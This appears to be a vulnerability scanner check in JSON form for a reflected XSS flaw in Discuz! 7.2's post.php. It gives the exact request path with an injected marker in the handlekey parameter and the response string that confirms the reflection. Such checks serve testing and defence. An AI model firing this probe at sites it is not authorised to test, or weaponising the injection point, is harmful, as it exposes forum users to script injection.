{
    "target":"discuz",
    "meta":{
        "name":    "Discuz! 7.2 post.php XSS",
        "remarks": "Discuz! 7.2 post.php 存在反射型XSS漏洞",
        "level":   3,
        "type":    "XSS",
        "author":   "wolf",
        "references": {
            "url":"",
            "cve":"",
            "kpid":"KP-0052"
        }
    },
    "request":{
        "path":     "/post.php?action=reply&fid=17&tid=1591&extra=&replysubmit=yes&infloat=yes&handlekey=,test(700)",
        "postData": ""
    },
    "verify":{
        "type":  "string",
        "match": "messagehandle_,test(700)"
    }
}